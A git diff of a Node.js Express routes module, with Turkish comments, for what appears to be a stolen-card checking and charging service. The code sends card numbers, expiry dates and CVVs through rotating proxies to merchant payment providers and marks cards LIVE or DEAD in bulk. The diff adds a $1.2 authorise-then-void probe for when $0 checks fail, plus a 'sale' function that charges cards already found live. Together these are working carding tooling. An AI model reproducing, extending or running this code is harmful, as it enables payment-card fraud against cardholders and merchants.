@@ -1,8 +1,9 @@
 // ============================================================
-// CARDS ROUTES — Live Cards + Verify + Balance + Recheck
-// Live Check: cardChecker.checkAndEnrich() (Recheck ile AYNI akış)
-// Preauth: cardChecker provider metodları (unified)
-// + Partial Refund (Auth + Kısmi Refund akışı)
+// CARDS ROUTES — v13.1
+// - bulk-recheck NDJSON
+// - $0 zero_auth_unsupported → infra (DEAD değil)
+// - bulk içinde $1.2 + void fallback
+// - admin default tümü + import sıralama + has_transactions
 // ============================================================
 const express = require('express');
 const router = express.Router();
@@ -18,10 +19,6 @@ module.exports = (deps) => {
   // HELPERS
   // ============================================================
 
-  /**
-   * DB'deki provider adını cardChecker.providers key'ine çevirir.
-   * 'clover' → 'clover3', 'authorize' → 'authorize3', vs.
-   */
   function normalizeProviderKey(key) {
     const k = String(key || '').toLowerCase();
     if (k === 'clover' || k === 'clover3') return 'clover3';
@@ -30,17 +27,10 @@ module.exports = (deps) => {
     return k;
   }
 
-  /**
-   * Provider instance'ından merchant bilgisini çıkar (defensive).
-   */
   function extractMerchantInfo(cardChecker, providerKey) {
-    if (!providerKey) {
-      return { merchantId: null, merchantName: null };
-    }
+    if (!providerKey) return { merchantId: null, merchantName: null };
     const provider = cardChecker?.providers?.[providerKey];
-    if (!provider) {
-      return { merchantId: null, merchantName: null };
-    }
+    if (!provider) return { merchantId: null, merchantName: null };
     return {
       merchantId: provider.config?.merchantId || null,
       merchantName: provider.name || providerKey,
@@ -55,9 +45,8 @@ module.exports = (deps) => {
         reasonShort: mapped.short, reasonLong: mapped.long,
         severity: mapped.severity, rawMessage: mapped.raw,
         provider: null, providerKey: null,
-        merchantId: null, merchantName: null,      // ⭐
-        providerCode: null,
-        message: null, bin: null, raw: null,
+        merchantId: null, merchantName: null,
+        providerCode: null, message: null, bin: null, raw: null,
         providerRaw: null, providerMessage: null,
         failover: false, unknown: false, error: null,
       };
@@ -80,7 +69,8 @@ module.exports = (deps) => {
         enriched.reason === 'provider_timeout' ||
         enriched.reason === 'invalid_response' ||
         enriched.reason === 'provider_config_error' ||
-        enriched.reason === 'network_error'
+        enriched.reason === 'network_error' ||
+        enriched.reason === 'zero_auth_unsupported'
       ) status = 'ERROR';
       else if (isUnknown) status = 'UNKNOWN';
       else status = 'DEAD';
@@ -95,8 +85,8 @@ module.exports = (deps) => {
       severity: mapped.severity, rawMessage: mapped.raw,
       provider: enriched.provider || enriched.providerKey || null,
       providerKey: enriched.providerKey || enriched.provider || null,
-      merchantId: enriched.merchantId ?? null,      // ⭐
-      merchantName: enriched.merchantName ?? null,  // ⭐
+      merchantId: enriched.merchantId ?? null,
+      merchantName: enriched.merchantName ?? null,
       providerCode: enriched.providerCode ?? null,
       message: enriched.message ?? null,
       avs: enriched.avs ?? null,
@@ -113,10 +103,6 @@ module.exports = (deps) => {
     };
   }
 
-  /**
-   * Balance response normalize.
-   * operation: 'preauth' | 'live_check'
-   */
   function normalizeBalanceResponse(raw, operation = 'preauth') {
     const success = !!raw.success;
     let reason = raw.reason || (success ? 'approved' : 'declined');
@@ -131,7 +117,7 @@ module.exports = (deps) => {
       status = raw.status && raw.status !== 'LIVE' && raw.status !== 'APPROVED'
         ? raw.status
         : (['provider_error', 'provider_timeout', 'invalid_response',
-            'provider_config_error', 'network_error'].includes(reason)
+            'provider_config_error', 'network_error', 'zero_auth_unsupported'].includes(reason)
             ? 'ERROR' : 'DEAD');
     }
 
@@ -139,47 +125,34 @@ module.exports = (deps) => {
     const chargeId = raw.chargeId ?? raw.transactionId ?? null;
 
     return {
-      success,
-      status,
-      operation,
-      reason,
-      reasonShort: mapped.short,
-      reasonLong: mapped.long,
-      severity: mapped.severity,
-      rawMessage: mapped.raw,
-
+      success, status, operation, reason,
+      reasonShort: mapped.short, reasonLong: mapped.long,
+      severity: mapped.severity, rawMessage: mapped.raw,
       provider: raw.provider || null,
       providerKey: raw.providerKey || raw.provider || null,
-      merchantId: raw.merchantId ?? null,       // ⭐ EKLENDİ
-      merchantName: raw.merchantName ?? null,   // ⭐ EKLENDİ
+      merchantId: raw.merchantId ?? null,
+      merchantName: raw.merchantName ?? null,
       providerCode: raw.providerCode ?? null,
       message: raw.message ?? null,
-
       amount: typeof raw.amount === 'number' ? raw.amount : 0,
       currency: raw.currency || 'USD',
       authCode: raw.authCode ?? null,
-      chargeId,
-      transactionId: chargeId,
-      txnId,
+      chargeId, transactionId: chargeId, txnId,
       refundedAmount: raw.refundedAmount ?? 0,
       refundTxnId: raw.refundTxnId ?? null,
       capturedAmount: raw.capturedAmount ?? 0,
       netAmount: raw.netAmount ?? null,
       captured: !!raw.captured,
       voided: !!raw.voided,
-
       capturable: !!success && operation === 'preauth' && !!txnId && !raw.captured && !raw.voided,
       voidable:   !!success && operation === 'preauth' && !!txnId && !raw.captured && !raw.voided,
-
       failover: raw.failover === true,
       attempts: raw.attempts ?? [],
-
       error: raw.error ? {
         code: raw.error.code || null,
         message: raw.error.message || null,
         declineCode: raw.error.declineCode || null,
       } : null,
-
       raw: raw.raw ?? null,
       providerRaw: raw.raw ?? null,
       providerMessage: raw.message ?? raw.error?.message ?? null,
@@ -201,14 +174,13 @@ module.exports = (deps) => {
   }
 
   // ============================================================
-  // LIVE CHECK VIA CARD CHECKER (failover dahili — checkAndEnrich)
-  // ⭐ v2: bulkMode destructure FIX + merchant bilgisi tüm return'lerde
+  // LIVE CHECK VIA CARD CHECKER
+  // ⭐ zero_auth_unsupported → infra (DEAD değil)
   // ============================================================
   async function tryLiveCheckViaCardChecker(card, cardChecker, ctx = {}) {
     const startTime = Date.now();
-    // ⭐ FIX: bulkMode eklendi
     const { userId, preferProvider = null, bulkMode = false } = ctx;
-    const effectivePreferProvider = preferProvider || (bulkMode ? 'clover3' : null);
+    const effectivePreferProvider = preferProvider || null;
 
     try {
       const [rawMonth, rawYear] = String(card.exp || '').split('/');
@@ -233,7 +205,6 @@ module.exports = (deps) => {
         email: card.email || '',
       };
 
-      // ⭐ preferProvider'ı checkCard'a geçir (bulk mode'da clover3 sabit)
       const enriched = await cardChecker.checkAndEnrich(parsed, {
         preferProvider: effectivePreferProvider || undefined,
       });
@@ -254,6 +225,17 @@ module.exports = (deps) => {
       }
       if (isSuccess) finalReason = 'approved';
 
+      // ⭐ zero_auth_unsupported → infra
+      const ZERO_UNSUPPORTED_REASONS = [
+        'zero_auth_unsupported',
+        'invalid_amount',
+        'amount_required',
+      ];
+      const isZeroUnsupported = !isSuccess && ZERO_UNSUPPORTED_REASONS.includes(enriched.reason);
+      if (isZeroUnsupported) {
+        finalReason = 'zero_auth_unsupported';
+      }
+
       let finalStatus;
       if (isSuccess) finalStatus = 'LIVE';
       else if (isFailover) finalStatus = 'ERROR';
@@ -263,13 +245,13 @@ module.exports = (deps) => {
         finalReason === 'provider_timeout' ||
         finalReason === 'invalid_response' ||
         finalReason === 'provider_config_error' ||
-        finalReason === 'network_error'
+        finalReason === 'network_error' ||
+        finalReason === 'zero_auth_unsupported'
       ) finalStatus = 'ERROR';
       else finalStatus = 'DEAD';
 
       const mapped = mapReason(finalReason, enriched.message || null);
 
-      // TXN LOG
       await dbService.logProviderTransaction({
         userId,
         cardId: card.id || null,
@@ -289,7 +271,6 @@ module.exports = (deps) => {
         durationMs: duration,
       }).catch((e) => console.warn('[LIVE-CHECK] Txn log hatası:', e.message));
 
-      // CARD UPDATE — sadece hüküm verilebilirse
       if (card.id) {
         if (isSuccess) {
           await db.pool.query(
@@ -299,8 +280,17 @@ module.exports = (deps) => {
               WHERE id = $1`,
             [card.id, providerKey]
           ).catch(() => {});
-        } else if (isFailover || isUnknown) {
-          // ⚠️ Provider hatası → kartı DEAD yapma
+        } else if (
+          isFailover ||
+          isUnknown ||
+          finalStatus === 'ERROR' ||
+          finalReason === 'provider_error' ||
+          finalReason === 'provider_timeout' ||
+          finalReason === 'network_error' ||
+          finalReason === 'invalid_response' ||
+          finalReason === 'provider_config_error' ||
+          finalReason === 'zero_auth_unsupported'
+        ) {
           await db.pool.query(
             `UPDATE live_cards_full
                 SET last_provider=COALESCE($2, last_provider),
@@ -309,7 +299,6 @@ module.exports = (deps) => {
             [card.id, providerKey]
           ).catch(() => {});
         } else {
-          // ❌ Gerçek kart reddi
           await db.pool.query(
             `UPDATE live_cards_full
                 SET status='DEAD', last_provider=$2, last_checked_at=NOW(),
@@ -321,7 +310,26 @@ module.exports = (deps) => {
         }
       }
 
-      // ⭐ RETURN — tüm branch'lerde merchantId + merchantName
+      // ⭐ zero_auth_unsupported → failover: true
+      if (isZeroUnsupported) {
+        return {
+          ok: false, failover: true, success: false,
+          status: 'ERROR',
+          reason: 'zero_auth_unsupported',
+          reasonShort: 'Zero-auth yok',
+          reasonLong: '$0 doğrulama desteklenmiyor; $1.2 + void fallback denenecek',
+          severity: 'low',
+          rawMessage: enriched.message || null,
+          provider: merchantName || null, providerKey,
+          merchantId, merchantName,
+          providerCode: enriched.providerCode || null,
+          message: enriched.message || null,
+          amount: 0, txnId: null, duration,
+          raw: enriched.raw || null,
+          providerRaw: enriched.raw || null,
+        };
+      }
+
       if (isSuccess) {
         return {
           ok: true, failover: false, success: true,
@@ -329,15 +337,14 @@ module.exports = (deps) => {
           reasonShort: 'Onaylandı', reasonLong: 'Live Check başarıyla onaylandı.',
           severity: 'low', rawMessage: null,
           provider: merchantName || 'clover3',
-          providerKey,
-          merchantId,
-          merchantName,
+          providerKey, merchantId, merchantName,
           providerCode: enriched.providerCode || null,
           message: enriched.message || null,
           amount: 0, currency: 'USD',
           authCode: enriched.authCode || null,
           chargeId: enriched.transactionId || null,
           txnId: null, refundedAmount: 0, netAmount: 0, voided: false,
+          verifyAmount: enriched.verifyAmount || 0,
           duration,
           raw: enriched.raw || null,
           providerRaw: enriched.raw || null,
@@ -353,10 +360,8 @@ module.exports = (deps) => {
           reasonLong: mapped.long || enriched.message || 'Provider altyapı hatası',
           severity: 'medium',
           rawMessage: mapped.raw || enriched.message || null,
-          provider: merchantName || null,
-          providerKey,
-          merchantId,
-          merchantName,
+          provider: merchantName || null, providerKey,
+          merchantId, merchantName,
           providerCode: enriched.providerCode || null,
           message: enriched.message || null,
           amount: 0, txnId: null, duration,
@@ -373,10 +378,8 @@ module.exports = (deps) => {
           reasonLong: mapped.long || enriched.message || 'Belirsiz yanıt',
           severity: mapped.severity || 'medium',
           rawMessage: mapped.raw || enriched.message || null,
-          provider: merchantName || null,
-          providerKey,
-          merchantId,
-          merchantName,
+          provider: merchantName || null, providerKey,
+          merchantId, merchantName,
           providerCode: enriched.providerCode || null,
           message: enriched.message || null,
           amount: 0, txnId: null, duration,
@@ -391,9 +394,7 @@ module.exports = (deps) => {
         reasonShort: mapped.short, reasonLong: mapped.long,
         severity: mapped.severity, rawMessage: mapped.raw,
         provider: merchantName || 'clover3',
-        providerKey,
-        merchantId,
-        merchantName,
+        providerKey, merchantId, merchantName,
         providerCode: enriched.providerCode || null,
         message: enriched.message || null,
         amount: 0, txnId: null, duration,
@@ -417,17 +418,268 @@ module.exports = (deps) => {
         severity: mapped.severity, rawMessage: mapped.raw,
         provider: null, providerKey: null,
         merchantId: null, merchantName: null,
-        providerCode: null,
-        message: e.message, error: e.message,
+        providerCode: null, message: e.message, error: e.message,
         amount: 0, txnId: null, duration: Date.now() - startTime,
         raw: null, providerRaw: null,
       };
     }
   }
 
+  // ⭐ v13.1: Belirli tutar ile liveCheck + void fallback
+  async function tryLiveCheckWithAmount(card, cardChecker, ctx = {}) {
+    const { userId, amount = 1.2, preferProvider = null } = ctx;
+    const startTime = Date.now();
+
+    try {
+      const [rawMonth, rawYear] = String(card.exp || '').split('/');
+      const expMonth = String(rawMonth || '12').padStart(2, '0').slice(0, 2);
+      let expYear = String(rawYear || '2030').trim();
+      if (expYear.length === 2) expYear = `20${expYear}`;
+      if (expYear.length !== 4) expYear = '2030';
+
+      const parsed = {
+        pan: String(card.pan || '').replace(/\D/g, ''),
+        expMonth, expYear,
+        cvv: String(card.cvv || '').trim() || '000',
+        brand: card.type || card.brand || '',
+        firstName: (card.name || 'Test User').split(' ')[0],
+        lastName: (card.name || 'Test User').split(' ').slice(1).join(' ') || 'User',
+        address: card.address || '',
+        city: card.city || '',
+        state: card.state || '',
+        zip: card.zip || '',
+        country: card.country || 'US',
+        phone: card.phone || '',
+        email: card.email || '',
+      };
+
+      const providerKey = preferProvider || 'clover3';
+      const provider = cardChecker?.providers?.[providerKey];
+      if (!provider || typeof provider.verify !== 'function') {
+        throw new Error(`Provider ${providerKey} verify desteklemiyor`);
+      }
+
+      let proxyStr = null;
+      try {
+        const { proxy } = cardChecker._getProxy();
+        proxyStr = proxy ? proxy.raw : null;
+      } catch (_) {}
+
+      const result = await provider.verify(parsed, proxyStr, { amount, capture: false });
+      const duration = Date.now() - startTime;
+
+      if (result.success && result.transactionId && typeof provider.voidTransaction === 'function') {
+        try {
+          const voidRes = await provider.voidTransaction(result.transactionId, proxyStr);
+          result.voided = !!voidRes.success;
+          console.log(
+            `[LIVE-CHECK-FALLBACK] void ${result.voided ? '✅' : '⚠️'} (${result.transactionId})`
+          );
+        } catch (e) {
+          console.warn(`[LIVE-CHECK-FALLBACK] void hatası: ${e.message}`);
+          result.voided = false;
+        }
+      }
+
+      const mapped = mapReason(
+        result.reason || (result.success ? 'approved' : 'declined'),
+        result.message || null
+      );
+
+      if (card.id) {
+        if (result.success) {
+          await db.pool.query(
+            `UPDATE live_cards_full
+                SET status='LIVE', last_provider=$2, last_checked_at=NOW(),
+                    dead_reason=NULL, dead_message=NULL, dead_at=NULL
+              WHERE id=$1`,
+            [card.id, providerKey]
+          ).catch(() => {});
+        } else if (
+          ['provider_error', 'provider_timeout', 'network_error',
+           'invalid_response', 'provider_config_error'].includes(result.reason)
+        ) {
+          await db.pool.query(
+            `UPDATE live_cards_full
+                SET last_provider=$2, last_checked_at=NOW()
+              WHERE id=$1`,
+            [card.id, providerKey]
+          ).catch(() => {});
+        } else {
+          await db.pool.query(
+            `UPDATE live_cards_full
+                SET status='DEAD', last_provider=$2, last_checked_at=NOW(),
+                    dead_reason=$3, dead_message=$4, dead_at=NOW(),
+                    total_declined_count = COALESCE(total_declined_count,0) + 1
+              WHERE id=$1`,
+            [card.id, providerKey, result.reason, mapped.long]
+          ).catch(() => {});
+        }
+      }
+
+      return {
+        ok: true, failover: false, success: !!result.success,
+        status: result.success ? 'LIVE' : 'DEAD',
+        reason: result.reason || (result.success ? 'approved' : 'declined'),
+        reasonShort: mapped.short, reasonLong: mapped.long,
+        severity: mapped.severity, rawMessage: mapped.raw,
+        provider: provider.name || providerKey,
+        providerKey,
+        merchantId: provider.config?.merchantId || null,
+        merchantName: provider.name || providerKey,
+        providerCode: result.providerCode || null,
+        message: result.message || null,
+        amount: result.verifyAmount || amount,
+        currency: 'USD',
+        authCode: result.authCode || null,
+        chargeId: result.transactionId || result.raw?.id || null,
+        transactionId: result.transactionId || result.raw?.id || null,
+        txnId: null, refundedAmount: 0, netAmount: 0,
+        voided: result.voided === true,
+        verifyAmount: result.verifyAmount || amount,
+        zeroAuthSupported: false,
+        duration,
+        raw: result.raw || null,
+        providerRaw: result.raw || null,
+      };
+    } catch (e) {
+      console.error(`[LIVE-CHECK-FALLBACK] ${e.message}`);
+      return null;
+    }
+  }
+  
   // ============================================================
-  // LIVE CHECK VIA SPECIFIC PROVIDER (ör. moneris verify)
-  // ⭐ v2: yarım return FIX
+// ⭐ SALE VIA PROVIDER (yeni — manuel/live kart çekimi için)
+// ============================================================
+async function runSaleViaProvider(card, amount, providerKey, cardChecker, ctx = {}) {
+  const { userId } = ctx;
+  const startTime = Date.now();
+  const key = normalizeProviderKey(providerKey);
+
+  const provider = cardChecker?.providers?.[key];
+  if (!provider) {
+    return {
+      ok: false, failover: true, success: false,
+      status: 'ERROR', reason: 'provider_not_found',
+      provider: key, providerKey: key,
+      error: `Provider bulunamadı: ${key}`,
+      duration: Date.now() - startTime,
+    };
+  }
+
+  let proxyStr = null;
+  try {
+    const { proxy } = cardChecker._getProxy();
+    proxyStr = proxy ? proxy.raw : null;
+  } catch (_) {}
+
+  const pan = String(card.pan || '').replace(/\D/g, '');
+  const currency = key === 'moneris'
+    ? (require('../config').MONERIS_CURRENCY || 'CAD')
+    : 'USD';
+
+  const txnBase = {
+    userId, cardId: card.id || null, provider: key,
+    action: 'sale', mode: 'live',
+    amount: Number(amount) || 0, currency,
+    pan,
+    panMasked: pan.length >= 10 ? pan.slice(0, 6) + '****' + pan.slice(-4) : pan,
+    bin: pan.slice(0, 6),
+    brand: card.type || card.brand || null,
+  };
+
+  let result;
+  try {
+    const fn = provider.sale || provider.purchase;
+    if (typeof fn !== 'function') {
+      return {
+        ok: false, failover: false, success: false,
+        status: 'ERROR', reason: 'sale_not_supported',
+        provider: provider.name || key, providerKey: key,
+        message: `${key} sale desteklemiyor`,
+        duration: Date.now() - startTime,
+      };
+    }
+    result = await fn.call(provider, card, amount, proxyStr);
+  } catch (e) {
+    const isNetwork = /network|fetch|timeout|ECONN|ETIMEDOUT|ENOTFOUND/i.test(e.message);
+    const isProviderError = e.message.startsWith('PROVIDER_ERROR:');
+
+    await dbService.logProviderTransaction({
+      ...txnBase,
+      status: 'error',
+      reason: isProviderError ? 'provider_error' : (isNetwork ? 'network_error' : 'unknown'),
+      message: e.message,
+      durationMs: Date.now() - startTime,
+    }).catch(() => {});
+
+    return {
+      ok: false,
+      failover: isProviderError || isNetwork,
+      success: false,
+      status: 'ERROR',
+      reason: isProviderError ? 'provider_error' : (isNetwork ? 'network_error' : 'provider_error'),
+      provider: provider.name || key, providerKey: key,
+      message: e.message, error: e.message,
+      duration: Date.now() - startTime,
+    };
+  }
+
+  const duration = Date.now() - startTime;
+  const mapped = mapReason(
+    result.reason || (result.success ? 'approved' : 'declined'),
+    result.message || null
+  );
+
+  try {
+    await dbService.logProviderTransaction({
+      ...txnBase,
+      providerTxnId: result.transactionId || result.chargeId || result.raw?.id || null,
+      providerCode: result.providerCode || null,
+      status: result.success ? 'approved' : 'declined',
+      reason: result.reason || (result.success ? 'approved' : 'declined'),
+      message: result.message || null,
+      rawResponse: result.raw || null,
+      durationMs: duration,
+    });
+  } catch (e) {
+    console.warn('[SALE] DB log hatası:', e.message);
+  }
+
+  if (card.id) {
+    if (result.success) {
+      await db.pool.query(
+        `UPDATE live_cards_full
+            SET status='LIVE', last_provider=$2, last_txn_at=NOW(),
+                total_sold = COALESCE(total_sold,0) + $3
+          WHERE id = $1`,
+        [card.id, key, Number(amount) || 0]
+      ).catch(() => {});
+    }
+  }
+
+  return {
+    ok: true, failover: false, success: !!result.success,
+    status: result.success ? 'APPROVED' : 'DEAD',
+    reason: result.reason || (result.success ? 'approved' : 'declined'),
+    reasonShort: mapped.short, reasonLong: mapped.long,
+    severity: mapped.severity, rawMessage: mapped.raw,
+    provider: provider.name || key, providerKey: key,
+    merchantId: provider.config?.merchantId || null,
+    merchantName: provider.name || key,
+    providerCode: result.providerCode || null,
+    message: result.message || null,
+    amount, currency,
+    authCode: result.authCode || null,
+    chargeId: result.transactionId || result.chargeId || result.raw?.id || null,
+    transactionId: result.transactionId || result.chargeId || result.raw?.id || null,
+    duration,
+    raw: result.raw || null,
+    providerRaw: result.raw || null,
+  };
+}
+  // ============================================================
+  // LIVE CHECK VIA SPECIFIC PROVIDER
   // ============================================================
   async function runLiveCheckViaProvider(card, providerKey, cardChecker, ctx = {}) {
     const { userId } = ctx;
@@ -452,35 +704,76 @@ module.exports = (deps) => {
       proxyStr = proxy ? proxy.raw : null;
     } catch (_) {}
 
+    const isProviderInfraReason = (reason) => [
+      'provider_error', 'provider_timeout', 'network_error',
+      'invalid_response', 'provider_config_error', 'zero_auth_unsupported',
+    ].includes(reason);
+
     try {
       if (typeof provider.verify !== 'function') {
         throw new Error(`${key} verify desteklemiyor`);
       }
+
       const probeCard = key.startsWith('clover')
-        ? { ...card, _amount: 0.01, _capture: false }
+        ? { ...card, _amount: 0, _capture: false }
         : card;
-      const result = await provider.verify(probeCard, proxyStr);
+
+      let result = await provider.verify(probeCard, proxyStr);
+
+      if (
+        !key.startsWith('clover') &&
+        !result.success &&
+        (result.reason === 'zero_auth_unsupported' ||
+          result.reason === 'invalid_amount' ||
+          result.reason === 'amount_required')
+      ) {
+        console.log(`[LIVE-CHECK-${key}] ⚠ $0 yok (${result.reason}) → $1.2 + void fallback`);
+        try {
+          result = await provider.verify(card, proxyStr, { amount: 1.2, capture: false });
+          result.verifyAmount = 1.2;
+          result.zeroAuthSupported = false;
+
+          if (result.success && result.transactionId && typeof provider.voidTransaction === 'function') {
+            try {
+              const voidRes = await provider.voidTransaction(result.transactionId, proxyStr);
+              result.voided = !!voidRes.success;
+            } catch (e) {
+              console.warn(`[LIVE-CHECK-${key}] void hatası: ${e.message}`);
+              result.voided = false;
+            }
+          }
+        } catch (fallbackErr) {
+          console.error(`[LIVE-CHECK-${key}] $1.2 fallback hatası: ${fallbackErr.message}`);
+          result = {
+            success: false, reason: 'provider_error', unknown: true,
+            message: fallbackErr.message, raw: null,
+          };
+        }
+      }
+
       const duration = Date.now() - startTime;
       const mapped = mapReason(
         result.reason || (result.success ? 'approved' : 'declined'),
         result.message || null
       );
 
+      const isInfraError = !result.success && (
+        isProviderInfraReason(result.reason) || result.unknown === true
+      );
+
       const pan = String(card.pan || '').replace(/\D/g, '');
       try {
         await dbService.logProviderTransaction({
-          userId,
-          cardId: card.id || null,
-          provider: key,
+          userId, cardId: card.id || null, provider: key,
           action: 'live_check', mode: 'live',
-          amount: 0, currency: 'USD',
+          amount: result.verifyAmount || 0, currency: 'USD',
           pan,
           panMasked: pan.slice(0, 6) + '****' + pan.slice(-4),
           bin: pan.slice(0, 6),
           brand: card.type || card.brand || null,
           providerTxnId: result.transactionId || result.raw?.id || null,
           providerCode: result.providerCode || null,
-          status: result.success ? 'approved' : 'declined',
+          status: result.success ? 'approved' : (isInfraError ? 'error' : 'declined'),
           reason: result.reason || (result.success ? 'approved' : 'declined'),
           message: result.message || null,
           rawResponse: result.raw || null,
@@ -493,6 +786,13 @@ module.exports = (deps) => {
           await db.pool.query(
             `UPDATE live_cards_full SET status='LIVE', last_provider=$2, last_checked_at=NOW(),
                 dead_reason=NULL, dead_message=NULL, dead_at=NULL WHERE id=$1`,
+            [card.id, key]
+          ).catch(() => {});
+        } else if (isInfraError) {
+          await db.pool.query(
+            `UPDATE live_cards_full
+                SET last_provider=$2, last_checked_at=NOW()
+              WHERE id=$1`,
             [card.id, key]
           ).catch(() => {});
         } else {
@@ -508,32 +808,29 @@ module.exports = (deps) => {
       const providerName = provider.name || key;
       const merchantId = provider.config?.merchantId || null;
 
-      // ⭐ v2: tam return (yarım bırakılmıştı)
+      const finalStatus = result.success
+        ? 'APPROVED'
+        : (isInfraError ? 'ERROR' : 'DEAD');
+
       return {
-        ok: true,
-        failover: false,
-        success: !!result.success,
-        status: result.success ? 'APPROVED' : 'DEAD',
+        ok: true, failover: isInfraError, success: !!result.success,
+        status: finalStatus,
         reason: result.reason || (result.success ? 'approved' : 'declined'),
-        reasonShort: mapped.short,
-        reasonLong: mapped.long,
-        severity: mapped.severity,
-        rawMessage: mapped.raw,
-        provider: providerName,
-        providerKey: key,
-        merchantId,
-        merchantName: providerName,
+        reasonShort: mapped.short, reasonLong: mapped.long,
+        severity: mapped.severity, rawMessage: mapped.raw,
+        provider: providerName, providerKey: key,
+        merchantId, merchantName: providerName,
         providerCode: result.providerCode || null,
         message: result.message || null,
-        amount: 0,
+        amount: result.verifyAmount || 0,
         currency: 'USD',
         authCode: result.authCode || null,
         chargeId: result.transactionId || result.raw?.id || null,
         transactionId: result.transactionId || result.raw?.id || null,
-        txnId: null,
-        refundedAmount: 0,
-        netAmount: 0,
-        voided: false,
+        txnId: null, refundedAmount: 0, netAmount: 0,
+        voided: result.voided === true,
+        verifyAmount: result.verifyAmount || 0,
+        zeroAuthSupported: result.zeroAuthSupported !== false,
         duration,
         raw: result.raw || null,
         providerRaw: result.raw || null,
@@ -542,11 +839,21 @@ module.exports = (deps) => {
       const duration = Date.now() - startTime;
       const isProviderError = e.message.startsWith('PROVIDER_ERROR:');
       const isNetwork = /network|fetch|timeout|ECONN|ETIMEDOUT|ENOTFOUND/i.test(e.message);
+      const isInfra = isProviderError || isNetwork;
+
+      if (card.id) {
+        await db.pool.query(
+          `UPDATE live_cards_full
+              SET last_provider=COALESCE($2, last_provider), last_checked_at=NOW()
+            WHERE id=$1`,
+          [card.id, key]
+        ).catch(() => {});
+      }
 
       return {
-        ok: false, failover: isProviderError || isNetwork, success: false,
+        ok: false, failover: isInfra, success: false,
         status: 'ERROR',
-        reason: isProviderError ? 'provider_error' : 'network_error',
+        reason: isProviderError ? 'provider_error' : (isNetwork ? 'network_error' : 'unknown'),
         provider: key, providerKey: key,
         merchantId: provider.config?.merchantId || null,
         merchantName: provider.name || key,
@@ -557,9 +864,7 @@ module.exports = (deps) => {
   }
 
   // ============================================================
-  // PREAUTH VIA PROVIDER (unified — eski try*Balance'ların yerine)
-  // + Partial Refund desteği (Auth + Kısmi Refund akışı)
-  // ⭐ v2: duplicate provider key FIX + merchantId + providerName
+  // PREAUTH VIA PROVIDER
   // ============================================================
   async function runPreauthViaProvider(card, amount, providerKey, cardChecker, ctx = {}) {
     const { userId, refundAmount = 0 } = ctx;
@@ -590,20 +895,15 @@ module.exports = (deps) => {
       : 'USD';
 
     const txnBase = {
-      userId,
-      cardId: card.id || null,
-      provider: key,
-      action: 'auth',
-      mode: 'live',
-      amount: Number(amount) || 0,
-      currency,
+      userId, cardId: card.id || null, provider: key,
+      action: 'auth', mode: 'live',
+      amount: Number(amount) || 0, currency,
       pan,
       panMasked: pan.length >= 10 ? pan.slice(0, 6) + '****' + pan.slice(-4) : pan,
       bin: pan.slice(0, 6),
       brand: card.type || card.brand || null,
     };
 
-    // ---- ANA İŞLEM (preauth) ----
     let result;
     try {
       if (key === 'moneris') {
@@ -637,17 +937,14 @@ module.exports = (deps) => {
       const providerName = provider.name || key;
       const merchantId = provider.config?.merchantId || null;
 
-      // ⭐ v2 FIX: duplicate provider key kaldırıldı, merchantId eklendi
       return {
         ok: false,
         failover: isProviderError || isNetwork,
         success: false,
         status: 'ERROR',
         reason: isProviderError ? 'provider_error' : (isNetwork ? 'network_error' : 'provider_error'),
-        provider: providerName,
-        providerKey: key,
-        merchantId,
-        merchantName: providerName,
+        provider: providerName, providerKey: key,
+        merchantId, merchantName: providerName,
         error: e.message, message: e.message,
         duration: Date.now() - startTime,
       };
@@ -659,7 +956,6 @@ module.exports = (deps) => {
       result.message || null
     );
 
-    // ---- PARENT TXN LOG ----
     let saved = null;
     try {
       saved = await dbService.logProviderTransaction({
@@ -676,9 +972,6 @@ module.exports = (deps) => {
       console.warn('[PREAUTH] DB log hatası:', e.message);
     }
 
-    // ============================================================
-    // ⭐ PARTIAL REFUND — başarılı preauth sonrası isteğe bağlı iade
-    // ============================================================
     const targetRefund = Math.max(0, Math.min(Number(refundAmount) || 0, amount));
     let refundedAmount = 0;
     let refundTxnId = null;
@@ -693,20 +986,15 @@ module.exports = (deps) => {
             refundedAmount = targetRefund;
 
             const refundTxn = await dbService.logProviderTransaction({
-              userId,
-              cardId: card.id || null,
-              provider: key,
-              action: 'refund',
-              mode: 'live',
-              amount: targetRefund,
-              currency,
+              userId, cardId: card.id || null, provider: key,
+              action: 'refund', mode: 'live',
+              amount: targetRefund, currency,
               pan,
               panMasked: pan.length >= 10 ? pan.slice(0, 6) + '****' + pan.slice(-4) : pan,
               bin: pan.slice(0, 6),
               brand: card.type || card.brand || null,
               providerTxnId: refundResult.transactionId || providerTxnId,
-              status: 'refunded',
-              reason: 'approved',
+              status: 'refunded', reason: 'approved',
               message: `Kısmi refund $${targetRefund}`,
               parentTxnId: saved?.id || null,
               durationMs: Date.now() - startTime - duration,
@@ -714,20 +1002,15 @@ module.exports = (deps) => {
 
             refundTxnId = refundTxn?.id || null;
           } else {
-            // Refund başarısız olsa da preauth başarılı → log düş
             await dbService.logProviderTransaction({
-              userId,
-              cardId: card.id || null,
-              provider: key,
-              action: 'refund',
-              mode: 'live',
-              amount: targetRefund,
-              currency,
+              userId, cardId: card.id || null, provider: key,
+              action: 'refund', mode: 'live',
+              amount: targetRefund, currency,
               pan,
               panMasked: pan.length >= 10 ? pan.slice(0, 6) + '****' + pan.slice(-4) : pan,
               bin: pan.slice(0, 6),
               brand: card.type || card.brand || null,
-              providerTxnId: providerTxnId,
+              providerTxnId,
               status: 'error',
               reason: refundResult.reason || 'refund_failed',
               message: refundResult.message || null,
@@ -741,7 +1024,6 @@ module.exports = (deps) => {
       }
     }
 
-    // ---- CARD UPDATE ----
     if (card.id) {
       if (result.success) {
         await db.pool.query(
@@ -766,34 +1048,25 @@ module.exports = (deps) => {
       }
     }
 
-    // ---- RETURN ----
     const providerName = provider.name || key;
     const merchantId = provider.config?.merchantId || null;
 
     return {
-      ok: true,
-      failover: false,
-      success: !!result.success,
+      ok: true, failover: false, success: !!result.success,
       status: result.success ? 'APPROVED' : 'DEAD',
       reason: result.reason || (result.success ? 'approved' : 'declined'),
-      reasonShort: mapped.short,
-      reasonLong: mapped.long,
-      severity: mapped.severity,
-      rawMessage: mapped.raw,
-      provider: providerName,              // ⭐ providerName (key değil)
-      providerKey: key,
-      merchantId,                          // ⭐ EKLENDİ
-      merchantName: providerName,          // ⭐ EKLENDİ
+      reasonShort: mapped.short, reasonLong: mapped.long,
+      severity: mapped.severity, rawMessage: mapped.raw,
+      provider: providerName, providerKey: key,
+      merchantId, merchantName: providerName,
       providerCode: result.providerCode || null,
       message: result.message || null,
-      amount,
-      currency,
+      amount, currency,
       authCode: result.authCode || null,
